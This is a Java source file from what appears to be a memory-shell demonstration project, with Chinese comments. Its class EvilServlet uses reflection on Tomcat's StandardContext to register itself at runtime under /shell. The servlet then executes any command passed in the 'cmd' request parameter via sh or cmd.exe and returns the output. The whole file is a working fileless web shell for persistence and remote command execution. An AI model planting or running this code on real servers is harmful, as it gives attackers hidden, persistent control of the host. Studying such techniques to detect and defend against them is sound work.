package com.example.memshell.Memdemo.tomcat;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class EvilServlet extends HttpServlet {
    public EvilServlet(){
        System.out.println("Servlet Injecting");
        try{
            //设置servlet名称
            String servletName = "shell";

            //通过Spring框架提供的RequestContextHolder拿到当前的WebApplicationContext，然后获取ServletContext
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT",0);
            ServletContext servletContext = context.getServletContext();

            //避免重复注册
            if(servletContext.getServletRegistration(servletName)==null){
                StandardContext standardContext = null;

                while(standardContext == null){
                    Field contextField = servletContext.getClass().getDeclaredField("context");
                    contextField.setAccessible(true);

                    Object contextObject = contextField.get(servletContext);

                    if(contextObject instanceof ServletContext){
                        servletContext = (ServletContext) contextObject;
                    }else if(contextObject instanceof StandardContext){
                        standardContext = (StandardContext) contextObject;
                    }
                }
                //创建一个Servlet所需要的wrapper
                Wrapper wrapper = standardContext.createWrapper();
                wrapper.setName(servletName);
                wrapper.setLoadOnStartup(1);
                wrapper.setServlet(new EvilServlet("whatever"));
                wrapper.setServletClass(EvilServlet.class.getName());

                //向 children 中添加 wrapper
                standardContext.addChild(wrapper);

                //添加 servletMappings
                standardContext.addServletMappingDecoded("/shell",servletName);
            }
            System.out.println("Servlet Injected");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    //重载一个构造函数 方便创建真正的Servlet
    public EvilServlet(String whatever){}

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{
        System.out.println("Injected Code Working");
        try{
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK" : "UTF-8";
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in, charsetName).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
